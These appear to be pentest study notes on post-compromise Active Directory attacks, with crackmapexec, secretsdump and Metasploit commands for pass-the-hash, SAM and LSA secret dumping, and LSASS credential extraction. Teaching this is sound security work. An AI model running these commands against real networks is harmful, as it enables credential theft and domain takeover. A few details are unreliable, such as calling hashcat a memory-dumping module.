### 🔒 **Attacking Active Directory: Post-Compromise Attacks**

**Objective**: Learn how to move **laterally** and **vertically** within an Active Directory (AD) environment after gaining initial access.

---

## 📝 **Summary**

1. **Pass-the-Password & Pass-the-Hash Attacks**:
    - Reuse cracked passwords or hashes to move laterally across a network.
2. **SAM Hash Dumping**:
    - Extract **hashed credentials** from compromised systems using **SAM dumps** for further exploitation.
3. **Enumerating Shares & LSA Secrets**:
    - Use **crackmapexec** to dump **shares** and **LSA secrets**, gaining access to more sensitive data.
4. **Credential Dumping Tools**:
    - Leverage tools like **Lsassy**, **hashcat**, and [**secretsdump.py**](http://secretsdump.py/) to dump credentials stored in memory.
5. **CME (CrackMapExec) Database**:
    - Store discovered credentials and hosts for further operations.

---

### **Summary of Lateral and Vertical Movement, SAM, SAM Hashes, and LSASS**

- **Lateral Movement**:
    - Moving **sideways** across the network, from one machine to another, using the same **credentials** or level of access.
    - 🖥️ **Example**: If you crack a user's password on Machine 1 and use it to log into Machine 2, you're moving laterally.
- **Vertical Movement**:
    - Moving **up** to gain **higher privileges**, such as becoming an **administrator** after starting as a regular user.
    - 🖥️ **Example**: If you start as a normal user and manage to get admin rights, you’ve moved vertically.
- **SAM (Security Account Manager)**:
    - A Windows **database** that stores **local user account information**, including **password hashes** for each user.
    - **SAM Hashes**: These are **encrypted passwords** stored in the SAM database, used to verify user logins.
    - 🖥️ **Example**: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b`.
- **LSASS (Local Security Authority Subsystem Service)**:
    - A Windows process that **enforces security policies** and stores **user credentials** in memory, such as passwords or Kerberos tickets.
    - **Why Important**: If you can access LSASS memory, you can **dump sensitive credentials** (like passwords) and use them to move further in the network.
- **Attack Example**:
    1. **Dump SAM hashes** from Machine 1 to get encrypted passwords.
    2. **Reuse those hashes** to log into Machine 2 (lateral movement).
    3. **Dump LSASS memory** on Machine 2 to extract admin credentials and move vertically (gaining more control).

---

---

## 📚 **Detailed Notes**

### **1. Pass-the-Password Attack**

Use this attack when you have **plaintext passwords** from a cracked account.

```bash
$ crackmapexec <ip/CIDR> -u <user> -d <domain> -p <password>

```

Look for **"Pwn3d!"** to verify successful authentication. This signifies access to the target machine.

---

### **2. Pass-the-Hash Attack**

If you only have **NTLM hashes**, pass the hash to authenticate:

```bash
$ crackmapexec smb <ip/CIDR> -u administrator -H <NTLM hash> --local-auth

```

💡 **Tip**: You can reuse hashes without needing to crack them!

---

### **3. Dumping SAM Hashes**

To retrieve **hashed passwords** stored in the **SAM database**:

- **From Metasploit**:
    
    ```bash
    msf6 > hashdump
    
    ```
    
- **From `secretsdump.py`**:
    
    ```bash
    secretsdump.py <domain>/<user>:<password>@<target_ip>
    
    ```
    
- **Using CrackMapExec**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam
    
    ```
    

🚨 **Critical Mention**: Be sure to verify your target’s **SAM hashes** with **"Pwn3d!"** in the output.

---

### **4. Enumerating Shares**

Find available **shares** on remote machines:

```bash
$ crackmapexec smb <ip/CIDR> -u administrator -H <hash> --local-auth --shares

```

💡 **Tip**: Look for writable shares that allow data manipulation.

---

### **5. Dumping LSA Secrets**

Extract **LSA secrets** for sensitive credentials, such as **Kerberos tickets**:

```bash
$ crackmapexec smb <ip/CIDR> -u administrator -H <hash> --local-auth --lsa

```

---

### **6. Using the Lsassy Module**

Dump credentials from **LSASS memory** using the **lsassy** module:

```bash
$ crackmapexec smb <ip/CIDR> -u administrator -H <hash> --local-auth -M lsassy

```

🚨 **Important**: Always look for **pwned credentials** dumped from LSASS.

---

### **7. Listing CrackMapExec Modules**

View available modules in **crackmapexec** for further attacks:

```bash
$ crackmapexec smb -L

```

💡 **Example**: Use **lsassy**, **wdigest**, or **hashcat** for credential attacks.

---

### **8. CME Database Usage**

After dumping credentials and hosts, store them in the **CME database** for later use:

- **To list hosts**:
    
    ```bash
    cmedb (default)(smb) > hosts
    
    ```
    
- **To list stored credentials**:
    
    ```bash
    cmedb (default)(smb) > creds
    
    ```
    

---

## 🔑 **Abbreviations & Definitions**

- **SAM (Security Account Manager)**: Stores **hashed passwords** for local user accounts.
- **LSASS (Local Security Authority Subsystem Service)**: Manages user logins and stores credentials in memory.
- **LSA Secrets**: Sensitive data in the registry storing **credentials** and **tickets**.
- **NTLM (NT LAN Manager)**: Authentication protocol used in Windows environments.
- **CrackMapExec (CME)**: Post-exploitation tool used for **Active Directory** attacks.
- **Pass-the-Hash Attack**: Attack where the **hash** is passed directly to authenticate without needing the plaintext password.
- **Kerberos**: Authentication protocol used in Active Directory for ticketing services.

---

## 🚨 **Critical Mentions & Exam Traps**

- **🚨 Always watch for "Pwn3d!"**: This is your green light that you’ve successfully compromised the target.
- **🚨 Use hashes to save time**: Rather than cracking passwords, pass **NTLM hashes** for lateral movement.
- **🚨 Verify flags and modules**: Ensure the correct flags and modules are used in **crackmapexec** to avoid unnecessary errors.
- **🚨 Know your output**: Pay close attention to **expected output** when dumping credentials to avoid misinterpreting results.

---

## 🛠️ **Cheat Sheet for Quick Reference**

### 🖥️ **Key Commands**:

- **Pass-the-Password**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
    
    ```
    
- **Pass-the-Hash**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u administrator -H <hash> --local-auth
    
    ```
    
- **Dump SAM Hashes**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam
    
    ```
    
- **Enumerate Shares**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u administrator -H <hash> --local-auth --shares
    
    ```
    
- **Dump LSA Secrets**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u administrator -H <hash> --local-auth --lsa
    
    ```
    
- **List CrackMapExec Modules**:
    
    ```bash
    crackmapexec smb -L
    
    ```
    

---

### 💡 **Pro Tips**:

- **💡 Command output matters**: Look for **"Pwn3d!"** in your outputs.
- **💡 Keep modules handy**: Use the **`L`** flag in **crackmapexec** to list all available modules and decide which attack vector to use.
- **💡 Keep LSA secrets in mind**: They hold valuable **credentials** that can be used for further attacks, like **Golden Ticket attacks**.

---
